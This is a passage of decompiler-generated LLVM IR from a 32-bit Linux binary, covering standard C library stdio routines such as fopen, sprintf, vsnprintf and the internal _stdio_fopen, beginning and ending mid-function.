  br i1 %v4_804e0bf, label %dec_label_pc_804e0bd.dec_label_pc_804e0d2_crit_edge, label %dec_label_pc_804e0c4

dec_label_pc_804e0bd.dec_label_pc_804e0d2_crit_edge: ; preds = %dec_label_pc_804e0bd
  br label %dec_label_pc_804e0d2

dec_label_pc_804e0c4:                             ; preds = %dec_label_pc_804e0bd
  %v1_804e0c8 = inttoptr i32 %v0_804e0c7 to i16*
  %v2_804e0c8 = call i32 @fflush_unlocked(i16* %v1_804e0c8)
  store i32 %v2_804e0c8, i32* @edi, align 4
  %v0_804e0d5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e0d2

dec_label_pc_804e0d2:                             ; preds = %dec_label_pc_804e0bd.dec_label_pc_804e0d2_crit_edge, %dec_label_pc_804e0c4
  %v0_804e0d5 = phi i32 [ %v0_804e0c7, %dec_label_pc_804e0bd.dec_label_pc_804e0d2_crit_edge ], [ %v0_804e0d5.pre, %dec_label_pc_804e0c4 ]
  %v1_804e0d5 = add i32 %v0_804e0d5, 4
  %v2_804e0d5 = inttoptr i32 %v1_804e0d5 to i32*
  %v3_804e0d5 = load i32, i32* %v2_804e0d5, align 4
  %v1_804e0d8 = call i32 @__libc_close(i32 %v3_804e0d5)
  %v0_804e0e0 = load i32, i32* @esi, align 4
  %v1_804e0e0 = add i32 %v0_804e0e0, 4
  %v2_804e0e0 = inttoptr i32 %v1_804e0e0 to i32*
  store i32 -1, i32* %v2_804e0e0, align 4
  %v2_804e0f1 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e0f1, i32* @ebx, align 4
  %v2_804e0f6 = icmp slt i32 %v1_804e0d8, 0
  store i32 -1, i32* @eax, align 4
  %v1_804e0fd = load i32, i32* @edi, align 4
  %v3_804e0fd = select i1 %v2_804e0f6, i32 -1, i32 %v1_804e0fd
  store i32 %v3_804e0fd, i32* @edi, align 4
  %v2_804e100 = call i32 @__pthread_return_void(i32 %v2_804e0f1, i32 134552147)
  %v1_804e10c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.148 to i32))
  %v0_804e111 = load i32, i32* @global_var_805c4e4.149, align 4
  %v1_804e116 = add i32 %v0_804e111, 1
  store i32 %v1_804e116, i32* @global_var_805c4e4.149, align 4
  store i32 ptrtoint (i32* @global_var_8058254.148 to i32), i32* @eax, align 4
  %v2_804e121 = call i32 @__pthread_return_void(i32 %v2_804e0f1, i32 1)
  %v0_804e126 = load i32, i32* @esi, align 4
  %v1_804e126 = inttoptr i32 %v0_804e126 to i32*
  %v2_804e126 = load i32, i32* %v1_804e126, align 4
  %v1_804e12b = and i32 %v2_804e126, 24576
  %v1_804e130 = or i32 %v1_804e12b, 48
  store i32 %v1_804e130, i32* @eax, align 4
  %v1_804e135 = trunc i32 %v1_804e130 to i16
  %v3_804e135 = inttoptr i32 %v0_804e126 to i16*
  store i16 %v1_804e135, i16* %v3_804e135, align 2
  br i1 %v1_804e09c, label %dec_label_pc_804e14b, label %dec_label_pc_804e13a

dec_label_pc_804e13a:                             ; preds = %dec_label_pc_804e0d2
  %v2_804e13e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e13e, i32* @eax, align 4
  %v2_804e143 = call i32 @__pthread_return_void(i32 %v2_804e13e, i32 1)
  store i32 %v2_804e143, i32* @eax, align 4
  br label %dec_label_pc_804e14b

dec_label_pc_804e14b:                             ; preds = %dec_label_pc_804e0d2, %dec_label_pc_804e13a
  %v0_804e14b = load i32, i32* @esi, align 4
  %v1_804e14b = add i32 %v0_804e14b, 1
  %v2_804e14b = inttoptr i32 %v1_804e14b to i8*
  %v3_804e14b = load i8, i8* %v2_804e14b, align 1
  %v4_804e14b = and i8 %v3_804e14b, 64
  %v5_804e14b = icmp eq i8 %v4_804e14b, 0
  br i1 %v5_804e14b, label %dec_label_pc_804e15f, label %dec_label_pc_804e151

dec_label_pc_804e151:                             ; preds = %dec_label_pc_804e14b
  %v1_804e154 = add i32 %v0_804e14b, 8
  %v2_804e154 = inttoptr i32 %v1_804e154 to i32*
  %v3_804e154 = load i32, i32* %v2_804e154, align 4
  %v1_804e157 = call i32 @free(i32 %v3_804e154)
  store i32 %v1_804e157, i32* @eax, align 4
  br label %dec_label_pc_804e15f

dec_label_pc_804e15f:                             ; preds = %dec_label_pc_804e14b, %dec_label_pc_804e151
  %v2_804e16b = call i32 @__pthread_return_void(i32 %v2_804e0f1, i32 134552147)
  %v1_804e177 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.148 to i32))
  store i32 ptrtoint (i32* @global_var_8058254.148 to i32), i32* @eax, align 4
  %v0_804e17d = load i32, i32* @global_var_805c4e8.150, align 8
  %v1_804e17d = add i32 %v0_804e17d, 1
  store i32 %v1_804e17d, i32* @global_var_805c4e8.150, align 8
  %v2_804e187 = call i32 @__pthread_return_void(i32 %v2_804e0f1, i32 1)
  %v0_804e18c = call i32 @_stdio_openlist_dec_use()
  %v0_804e194 = load i32, i32* @edi, align 4
  store i32 %v0_804e08f, i32* @ebx, align 4
  store i32 %v0_804e08e, i32* @esi, align 4
  store i32 %v0_804e08d, i32* @edi, align 4
  store i32 %v0_804e08c, i32* @ebp, align 4
  ret i32 %v0_804e194

; uselistorder directives
  uselistorder i32 %v2_804e0f1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_804e15f, { 1, 0 }
  uselistorder label %dec_label_pc_804e14b, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804e0bd, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804e1ab = inttoptr i32 %arg2 to i8*
  %v5_804e1ab = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804e1ab, i32 0, i32 -1)
  ret i32 %v5_804e1ab
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804e1b7 = ptrtoint i32* %stack_var_12 to i32
  %v4_804e1ca = inttoptr i32 %arg1 to i8*
  %v5_804e1ca = call i32 @__GI_vsnprintf(i8* %v4_804e1ca, i32 -1, i32 %arg2, i32 %v2_804e1b7)
  ret i32 %v5_804e1ca
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e1d4 = load i32, i32* @ebp, align 4
  %v0_804e1d5 = load i32, i32* @edi, align 4
  %v0_804e1d6 = load i32, i32* @esi, align 4
  %v0_804e1d7 = load i32, i32* @ebx, align 4
  store i32 %v0_804e1d7, i32* %stack_var_-16, align 4
  %v4_804e1db = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e1db, i32* @esi, align 4
  %v2_804e1df = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804e1ea = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804e1ea, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804e204 = sub i32 -1, %v4_804e1db
  %v1_804e217 = call i32 @__stdio_init_mutex(i32 %v2_804e1df)
  %v1_804e227 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804e204, %v1_804e227
  %v5_804e229 = select i1 %tmp, i32 %v1_804e204, i32 %v1_804e227
  store i32 %v5_804e229, i32* @ebx, align 4
  %v0_804e22c = load i32, i32* @esi, align 4
  %v3_804e256 = inttoptr i32 %arg3 to i8*
  %v4_804e256 = call i32 @_vfprintf_internal(i32 %v2_804e1ea, i8* %v3_804e256, i32 %arg4)
  %v1_804e25e = icmp eq i32 %v5_804e229, 0
  store i32 %v4_804e256, i32* @edx, align 4
  br i1 %v1_804e25e, label %dec_label_pc_804e27a, label %dec_label_pc_804e273

dec_label_pc_804e273:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_804e22c to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804e27d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e27a

dec_label_pc_804e27a:                             ; preds = %entry, %dec_label_pc_804e273
  %v0_804e27d = phi i32 [ %v4_804e256, %entry ], [ %v0_804e27d.pre, %dec_label_pc_804e273 ]
  %v2_804e27f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e27f, i32* @ebx, align 4
  store i32 %v0_804e1d6, i32* @esi, align 4
  store i32 %v0_804e1d5, i32* @edi, align 4
  store i32 %v0_804e1d4, i32* @ebp, align 4
  ret i32 %v0_804e27d

; uselistorder directives
  uselistorder i32 %v1_804e227, { 1, 0 }
  uselistorder i32 %v1_804e204, { 1, 0 }
  uselistorder label %dec_label_pc_804e27a, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e284 = load i32, i32* @ebp, align 4
  %v0_804e285 = load i32, i32* @edi, align 4
  %v0_804e286 = load i32, i32* @esi, align 4
  %v0_804e287 = load i32, i32* @ebx, align 4
  store i32 %v0_804e287, i32* %stack_var_-16, align 4
  %v4_804e28b = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e28b, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804e29b = load i8, i8* %arg2, align 1
  %v3_804e29b = zext i8 %v2_804e29b to i32
  %v4_804e29b = load i32, i32* @eax, align 4
  %v5_804e29b = and i32 %v4_804e29b, -256
  %v6_804e29b = or i32 %v5_804e29b, %v3_804e29b
  store i32 %v6_804e29b, i32* %eax.global-to-local, align 4
  %v10_804e29d = icmp eq i8 %v2_804e29b, 114
  br i1 %v10_804e29d, label %dec_label_pc_804e2df, label %dec_label_pc_804e2a1

dec_label_pc_804e2a1:                             ; preds = %entry
  %v10_804e2a1 = icmp eq i8 %v2_804e29b, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804e2a1, label %dec_label_pc_804e2e1, label %dec_label_pc_804e2aa

dec_label_pc_804e2aa:                             ; preds = %dec_label_pc_804e2a1
  %v10_804e2aa = icmp eq i8 %v2_804e29b, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804e2aa, label %dec_label_pc_804e2e1, label %dec_label_pc_804e2b2

dec_label_pc_804e2b2:                             ; preds = %dec_label_pc_804e2aa, %dec_label_pc_804e35a, %dec_label_pc_804e334
  %v0_804e2b2 = load i32, i32* %stack_var_-16, align 4
  %v1_804e2b2 = call i32 @__errno_location(i32 %v0_804e2b2)
  store i32 %v1_804e2b2, i32* %eax.global-to-local, align 4
  %v0_804e2b7 = load i32, i32* @ebp, align 4
  %v1_804e2b7 = icmp eq i32 %v0_804e2b7, 0
  %v1_804e2b9 = inttoptr i32 %v1_804e2b2 to i32*
  store i32 22, i32* %v1_804e2b9, align 4
  br i1 %v1_804e2b7, label %dec_label_pc_804e4bb, label %dec_label_pc_804e2c5

dec_label_pc_804e2c5:                             ; preds = %dec_label_pc_804e2b2, %dec_label_pc_804e37d
  %v0_804e2c5 = load i32, i32* @ebp, align 4
  %v1_804e2c5 = add i32 %v0_804e2c5, 1
  %v2_804e2c5 = inttoptr i32 %v1_804e2c5 to i8*
  %v3_804e2c5 = load i8, i8* %v2_804e2c5, align 1
  %v4_804e2c5 = and i8 %v3_804e2c5, 32
  %v5_804e2c5 = icmp eq i8 %v4_804e2c5, 0
  br i1 %v5_804e2c5, label %dec_label_pc_804e4bb, label %dec_label_pc_804e2cf

dec_label_pc_804e2cf:                             ; preds = %dec_label_pc_804e2c5
  store i32 %v0_804e2c5, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804e2d5 = call i32 @free(i32 %v0_804e2c5)
  br label %dec_label_pc_804e4b6

dec_label_pc_804e2df:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e2e1

dec_label_pc_804e2e1:                             ; preds = %dec_label_pc_804e2aa, %dec_label_pc_804e2a1, %dec_label_pc_804e2df
  %v0_804e2f2 = phi i32 [ 1089, %dec_label_pc_804e2aa ], [ 577, %dec_label_pc_804e2a1 ], [ 0, %dec_label_pc_804e2df ]
  %v1_804e2e1 = add i32 %v4_804e28b, 1
  %v2_804e2e1 = inttoptr i32 %v1_804e2e1 to i8*
  %v3_804e2e1 = load i8, i8* %v2_804e2e1, align 1
  %v12_804e2e1 = icmp eq i8 %v3_804e2e1, 98
  %v1_804e2e1.v4_804e28b = select i1 %v12_804e2e1, i32 %v1_804e2e1, i32 %v4_804e28b
  store i32 %v1_804e2e1.v4_804e28b, i32* %eax.global-to-local, align 4
  %v1_804e2ec = add i32 %v1_804e2e1.v4_804e28b, 1
  %v2_804e2ec = inttoptr i32 %v1_804e2ec to i8*
  %v3_804e2ec = load i8, i8* %v2_804e2ec, align 1
  %v12_804e2ec = icmp eq i8 %v3_804e2ec, 43
  %v1_804e2f0 = icmp eq i1 %v12_804e2ec, false
  br i1 %v1_804e2f0, label %dec_label_pc_804e2fa, label %dec_label_pc_804e2f2

dec_label_pc_804e2f2:                             ; preds = %dec_label_pc_804e2e1
  %v1_804e2f4 = or i32 %v0_804e2f2, 1
  store i32 %v1_804e2f4, i32* %eax.global-to-local, align 4
  %v1_804e2f7 = add nuw nsw i32 %v1_804e2f4, 1
  store i32 %v1_804e2f7, i32* @ebx, align 4
  br label %dec_label_pc_804e2fa

dec_label_pc_804e2fa:                             ; preds = %dec_label_pc_804e2e1, %dec_label_pc_804e2f2
  %v0_804e37d7 = phi i32 [ %v0_804e2f2, %dec_label_pc_804e2e1 ], [ %v1_804e2f7, %dec_label_pc_804e2f2 ]
  %v1_804e2fa = icmp eq i32 %arg3, 0
  %v1_804e2fc = icmp eq i1 %v1_804e2fa, false
  br i1 %v1_804e2fc, label %dec_label_pc_804e330, label %dec_label_pc_804e2fe

dec_label_pc_804e2fe:                             ; preds = %dec_label_pc_804e2fa
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804e303 = call i32 @malloc(i32 80)
  store i32 %v1_804e303, i32* %eax.global-to-local, align 4
  %v2_804e30b = icmp eq i32 %v1_804e303, 0
  store i32 %v1_804e303, i32* @ebp, align 4
  br i1 %v2_804e30b, label %dec_label_pc_804e4bd, label %dec_label_pc_804e315

dec_label_pc_804e315:                             ; preds = %dec_label_pc_804e2fe
  %v2_804e303 = inttoptr i32 %v1_804e303 to i16*
  store i16 8192, i16* %v2_804e303, align 2
  %v2_804e31d = add i32 %v1_804e303, 8
  %v3_804e31d = inttoptr i32 %v2_804e31d to i32*
  store i32 0, i32* %v3_804e31d, align 4
  %v2_804e324 = add i32 %v1_804e303, 56
  store i32 %v2_804e324, i32* %eax.global-to-local, align 4
  store i32 %v2_804e324, i32* %stack_var_-76, align 4
  %v1_804e328 = call i32 @__stdio_init_mutex(i32 %v2_804e324)
  store i32 %v1_804e328, i32* %eax.global-to-local, align 4
  %v0_804e37d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e330

dec_label_pc_804e330:                             ; preds = %dec_label_pc_804e2fa, %dec_label_pc_804e315
  %v2_804e383 = phi i32 [ %v0_804e37d7, %dec_label_pc_804e2fa ], [ %v0_804e37d.pre, %dec_label_pc_804e315 ]
  %v2_804e330 = icmp slt i32 %arg4, 0
  br i1 %v2_804e330, label %dec_label_pc_804e37d, label %dec_label_pc_804e334

dec_label_pc_804e334:                             ; preds = %dec_label_pc_804e330
  %v1_804e336 = and i32 %v2_804e383, 32771
  %v1_804e33c = add nuw nsw i32 %v1_804e336, 1
  store i32 %v1_804e33c, i32* @edx, align 4
  %v0_804e33d = load i32, i32* @esi, align 4
  %v1_804e33d = add i32 %v0_804e33d, 1
  %v2_804e340 = and i32 %v1_804e33d, %v1_804e33c
  store i32 %v2_804e340, i32* %eax.global-to-local, align 4
  %v12_804e342 = icmp eq i32 %v2_804e340, %v1_804e33c
  %v1_804e344 = load i32, i32* @ebp, align 4
  %v2_804e344 = add i32 %v1_804e344, 4
  %v3_804e344 = inttoptr i32 %v2_804e344 to i32*
  store i32 %arg4, i32* %v3_804e344, align 4
  %v1_804e347 = icmp eq i1 %v12_804e342, false
  br i1 %v1_804e347, label %dec_label_pc_804e2b2, label %dec_label_pc_804e34d

dec_label_pc_804e34d:                             ; preds = %dec_label_pc_804e334
  %v0_804e34d = load i32, i32* @esi, align 4
  %v1_804e34f = and i32 %v0_804e34d, 1024
  %v1_804e351 = xor i32 %v1_804e34f, 1024
  store i32 %v1_804e351, i32* %eax.global-to-local, align 4
  %v1_804e356 = load i32, i32* @ebx, align 4
  %v2_804e356 = and i32 %v1_804e356, %v1_804e351
  %v3_804e356 = icmp eq i32 %v2_804e356, 0
  br i1 %v3_804e356, label %dec_label_pc_804e34d.dec_label_pc_804e373_crit_edge, label %dec_label_pc_804e35a

dec_label_pc_804e34d.dec_label_pc_804e373_crit_edge: ; preds = %dec_label_pc_804e34d
  br label %dec_label_pc_804e373

dec_label_pc_804e35a:                             ; preds = %dec_label_pc_804e34d
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804e363 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804e363, i32* %eax.global-to-local, align 4
  %v1_804e36b = icmp eq i32 %v3_804e363, 0
  %v1_804e36d = icmp eq i1 %v1_804e36b, false
  br i1 %v1_804e36d, label %dec_label_pc_804e2b2, label %dec_label_pc_804e35a.dec_label_pc_804e373_crit_edge

dec_label_pc_804e35a.dec_label_pc_804e373_crit_edge: ; preds = %dec_label_pc_804e35a
  %v0_804e373.pre = load i32, i32* @esi, align 4
  %v0_804e379.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e373

dec_label_pc_804e373:                             ; preds = %dec_label_pc_804e34d.dec_label_pc_804e373_crit_edge, %dec_label_pc_804e35a.dec_label_pc_804e373_crit_edge
  %v0_804e379 = phi i32 [ %v1_804e356, %dec_label_pc_804e34d.dec_label_pc_804e373_crit_edge ], [ %v0_804e379.pre, %dec_label_pc_804e35a.dec_label_pc_804e373_crit_edge ]
  %v0_804e373 = phi i32 [ %v0_804e34d, %dec_label_pc_804e34d.dec_label_pc_804e373_crit_edge ], [ %v0_804e373.pre, %dec_label_pc_804e35a.dec_label_pc_804e373_crit_edge ]
  %v1_804e373 = and i32 %v0_804e373, 32768
  %v2_804e379 = or i32 %v1_804e373, %v0_804e379
  store i32 %v2_804e379, i32* @ebx, align 4
  br label %dec_label_pc_804e3a1

dec_label_pc_804e37d:                             ; preds = %dec_label_pc_804e330
  %v11_804e37f = or i32 %v2_804e383, 32768
  store i32 %v11_804e37f, i32* %eax.global-to-local, align 4
  %v1_804e382 = add i32 %arg4, 1
  %v8_804e382 = icmp eq i32 %v1_804e382, 0
  store i32 %v1_804e382, i32* @edi, align 4
  %v1_804e383 = icmp eq i1 %v8_804e382, false
  %v4_804e383 = select i1 %v1_804e383, i32 %v11_804e37f, i32 %v2_804e383
  store i32 %v4_804e383, i32* @ebx, align 4
  %v0_804e38d = load i32, i32* @esi, align 4
  store i32 %v0_804e38d, i32* %stack_var_-76, align 4
  %v3_804e38e = inttoptr i32 %v0_804e38d to i8*
  %v4_804e38e = call i32 @__libc_open(i8* %v3_804e38e, i32 %v4_804e383)
  store i32 %v4_804e38e, i32* %eax.global-to-local, align 4
  %v2_804e396 = icmp slt i32 %v4_804e38e, 0
  %v1_804e398 = load i32, i32* @ebp, align 4
  %v2_804e398 = add i32 %v1_804e398, 4
  %v3_804e398 = inttoptr i32 %v2_804e398 to i32*
  store i32 %v4_804e38e, i32* %v3_804e398, align 4
  br i1 %v2_804e396, label %dec_label_pc_804e2c5, label %dec_label_pc_804e3a1

dec_label_pc_804e3a1:                             ; preds = %dec_label_pc_804e37d, %dec_label_pc_804e373
  %v0_804e3a1 = load i32, i32* @ebp, align 4
  %v1_804e3a1 = inttoptr i32 %v0_804e3a1 to i32*
  %v2_804e3a1 = load i32, i32* %v1_804e3a1, align 4
  %v2_804e3a1.tr = trunc i32 %v2_804e3a1 to i16
  %v1_804e3a9 = and i16 %v2_804e3a1.tr, 8192
  %v3_804e3a9 = inttoptr i32 %v0_804e3a1 to i16*
  store i16 %v1_804e3a9, i16* %v3_804e3a9, align 2
  %v0_804e3ad = load i32, i32* @ebx, align 4
  store i32 %v0_804e3ad, i32* %eax.global-to-local, align 4
  %v1_804e3af = and i32 %v0_804e3ad, -31744
  %v0_804e3b5 = load i32, i32* @ebp, align 4
  %v1_804e3b5 = inttoptr i32 %v0_804e3b5 to i32*
  %v2_804e3b5 = load i32, i32* %v1_804e3b5, align 4
  %v1_804e3b8 = mul i32 %v0_804e3ad, 16
  %v1_804e3bb = and i32 %v1_804e3b8, 48
  %v1_804e3bc = add nuw nsw i32 %v1_804e3bb, 16
  %v2_804e3bf = xor i32 %v1_804e3bc, 48
  %v2_804e3c2 = or i32 %v2_804e3b5, %v1_804e3af
  %v2_804e3c4 = or i32 %v2_804e3c2, %v2_804e3bf
  store i32 %v2_804e3c4, i32* %eax.global-to-local, align 4
  %v1_804e3c6 = trunc i32 %v2_804e3c4 to i16
  %v3_804e3c6 = inttoptr i32 %v0_804e3b5 to i16*
  store i16 %v1_804e3c6, i16* %v3_804e3c6, align 2
  %v0_804e3ca = load i32, i32* %stack_var_-76, align 4
  %v1_804e3ca = call i32 @__errno_location(i32 %v0_804e3ca)
  store i32 %v1_804e3ca, i32* %eax.global-to-local, align 4
  %v0_804e3d2 = load i32, i32* @ebp, align 4
  %v1_804e3d2 = inttoptr i32 %v0_804e3d2 to i16*
  %v2_804e3d2 = load i16, i16* %v1_804e3d2, align 2
  %v3_804e3d2 = zext i16 %v2_804e3d2 to i32
  store i32 %v3_804e3d2, i32* @ebx, align 4
  %v1_804e3d6 = inttoptr i32 %v1_804e3ca to i32*
  %v2_804e3d6 = load i32, i32* %v1_804e3d6, align 4
  store i32 %v2_804e3d6, i32* @edi, align 4
  store i32 %v1_804e3ca, i32* @esi, align 4
  %v1_804e3da = add i32 %v0_804e3d2, 4
  %v2_804e3da = inttoptr i32 %v1_804e3da to i32*
  %v3_804e3da = load i32, i32* %v2_804e3da, align 4
  store i32 %v3_804e3da, i32* %stack_var_-76, align 4
  %v1_804e3dd = call i32 @isatty(i32 %v3_804e3da)
  %v2_804e3e5 = mul i32 %v1_804e3dd, 256
  store i32 %v2_804e3e5, i32* %eax.global-to-local, align 4
  %v0_804e3e8 = load i32, i32* @ebx, align 4
  %v2_804e3e8 = or i32 %v0_804e3e8, %v2_804e3e5
  store i32 %v2_804e3e8, i32* @ebx, align 4
  %v1_804e3ea = trunc i32 %v2_804e3e8 to i16
  %v2_804e3ea = load i32, i32* @ebp, align 4
  %v3_804e3ea = inttoptr i32 %v2_804e3ea to i16*
  store i16 %v1_804e3ea, i16* %v3_804e3ea, align 2
  %v0_804e3ee = load i32, i32* @edi, align 4
  %v1_804e3ee = load i32, i32* @esi, align 4
  %v2_804e3ee = inttoptr i32 %v1_804e3ee to i32*
  store i32 %v0_804e3ee, i32* %v2_804e3ee, align 4
  %v0_804e3f0 = load i32, i32* @ebp, align 4
  %v1_804e3f0 = add i32 %v0_804e3f0, 8
  %v2_804e3f0 = inttoptr i32 %v1_804e3f0 to i32*
  %v3_804e3f0 = load i32, i32* %v2_804e3f0, align 4
  %v4_804e3f0 = icmp eq i32 %v3_804e3f0, 0
  %v1_804e3f4 = icmp eq i1 %v4_804e3f0, false
  br i1 %v1_804e3f4, label %dec_label_pc_804e428, label %dec_label_pc_804e3f6

dec_label_pc_804e3f6:                             ; preds = %dec_label_pc_804e3a1
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804e3fe = call i32 @malloc(i32 4096)
  store i32 %v1_804e3fe, i32* %eax.global-to-local, align 4
  %v1_804e406 = icmp eq i32 %v1_804e3fe, 0
  %v1_804e408 = load i32, i32* @ebp, align 4
  %v2_804e408 = add i32 %v1_804e408, 8
  %v3_804e408 = inttoptr i32 %v2_804e408 to i32*
  store i32 %v1_804e3fe, i32* %v3_804e408, align 4
  br i1 %v1_804e406, label %dec_label_pc_804e421, label %dec_label_pc_804e40d

dec_label_pc_804e40d:                             ; preds = %dec_label_pc_804e3f6
  %v1_804e40d = add i32 %v1_804e3fe, 4096
  store i32 %v1_804e40d, i32* %eax.global-to-local, align 4
  %v1_804e412 = load i32, i32* @ebp, align 4
  %v2_804e412 = add i32 %v1_804e412, 12
  %v3_804e412 = inttoptr i32 %v2_804e412 to i32*
  store i32 %v1_804e40d, i32* %v3_804e412, align 4
  %v0_804e415 = load i32, i32* @ebp, align 4
  %v1_804e415 = inttoptr i32 %v0_804e415 to i32*
  %v2_804e415 = load i32, i32* %v1_804e415, align 4
  %v1_804e418 = udiv i32 %v2_804e415, 256
  %v3_804e418 = and i32 %v1_804e418, 191
  %v8_804e418 = or i32 %v3_804e418, 64
  %v10_804e418 = mul nuw nsw i32 %v8_804e418, 256
  %v11_804e418 = and i32 %v2_804e415, -65281
  %v12_804e418 = or i32 %v10_804e418, %v11_804e418
  store i32 %v12_804e418, i32* %eax.global-to-local, align 4
  %v1_804e41b = trunc i32 %v12_804e418 to i16
  %v3_804e41b = inttoptr i32 %v0_804e415 to i16*
  store i16 %v1_804e41b, i16* %v3_804e41b, align 2
  br label %dec_label_pc_804e428

dec_label_pc_804e421:                             ; preds = %dec_label_pc_804e3f6
  %v0_804e421 = load i32, i32* @ebp, align 4
  %v1_804e421 = add i32 %v0_804e421, 12
  %v2_804e421 = inttoptr i32 %v1_804e421 to i32*
  store i32 0, i32* %v2_804e421, align 4
  br label %dec_label_pc_804e428

dec_label_pc_804e428:                             ; preds = %dec_label_pc_804e3a1, %dec_label_pc_804e40d, %dec_label_pc_804e421
  %v0_804e428 = load i32, i32* @ebp, align 4
  %v1_804e428 = add i32 %v0_804e428, 8
  %v2_804e428 = inttoptr i32 %v1_804e428 to i32*
  %v3_804e428 = load i32, i32* %v2_804e428, align 4
  store i32 %v3_804e428, i32* %eax.global-to-local, align 4
  %v1_804e42b = add i32 %v0_804e428, 2
  %v2_804e42b = inttoptr i32 %v1_804e42b to i8*
  store i8 0, i8* %v2_804e42b, align 1
  %v0_804e42f = load i32, i32* @ebp, align 4
  %v1_804e42f = add i32 %v0_804e42f, 44
  %v2_804e42f = inttoptr i32 %v1_804e42f to i32*
  store i32 0, i32* %v2_804e42f, align 4
  %v0_804e436 = load i32, i32* @ebp, align 4
  %v1_804e436 = add i32 %v0_804e436, 1
  %v2_804e436 = inttoptr i32 %v1_804e436 to i8*
  %v3_804e436 = load i8, i8* %v2_804e436, align 1
  %v4_804e436 = and i8 %v3_804e436, 32
  %v5_804e436 = icmp eq i8 %v4_804e436, 0
  %v0_804e43a = load i32, i32* %eax.global-to-local, align 4
  %v2_804e43a = add i32 %v0_804e436, 24
  %v3_804e43a = inttoptr i32 %v2_804e43a to i32*
  store i32 %v0_804e43a, i32* %v3_804e43a, align 4
  %v0_804e43d = load i32, i32* %eax.global-to-local, align 4
  %v1_804e43d = load i32, i32* @ebp, align 4
  %v2_804e43d = add i32 %v1_804e43d, 28
  %v3_804e43d = inttoptr i32 %v2_804e43d to i32*
  store i32 %v0_804e43d, i32* %v3_804e43d, align 4
  %v0_804e440 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e440 = load i32, i32* @ebp, align 4
  %v2_804e440 = add i32 %v1_804e440, 16
  %v3_804e440 = inttoptr i32 %v2_804e440 to i32*
  store i32 %v0_804e440, i32* %v3_804e440, align 4
  %v0_804e443 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e443 = load i32, i32* @ebp, align 4
  %v2_804e443 = add i32 %v1_804e443, 20
  %v3_804e443 = inttoptr i32 %v2_804e443 to i32*
  store i32 %v0_804e443, i32* %v3_804e443, align 4
  %v0_804e446 = load i32, i32* @global_var_805826c.151, align 4
  store i32 %v0_804e446, i32* @eax, align 4
  %v1_804e44b = load i32, i32* @ebp, align 4
  %v2_804e44b = add i32 %v1_804e44b, 52
  %v3_804e44b = inttoptr i32 %v2_804e44b to i32*
  store i32 %v0_804e446, i32* %v3_804e44b, align 4
  br i1 %v5_804e436, label %dec_label_pc_804e4bd, label %dec_label_pc_804e450

dec_label_pc_804e450:                             ; preds = %dec_label_pc_804e428
  %v2_804e45b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e45b, i32* %stack_var_-76, align 4
  %v2_804e460 = call i32 @__pthread_return_void(i32 %v2_804e45b, i32 134552147)
  store i32 %v2_804e460, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058254.148 to i32), i32* %stack_var_-76, align 4
  %v1_804e46c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.148 to i32))
  store i32 %v1_804e46c, i32* @eax, align 4
  %v2_804e47e = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e47e, i32* %stack_var_-76, align 4
  %v2_804e483 = call i32 @__pthread_return_void(i32 %v2_804e47e, i32 134552147)
  store i32 %v2_804e483, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805823c.152 to i32), i32* %stack_var_-76, align 4
  %v1_804e48f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805823c.152 to i32))
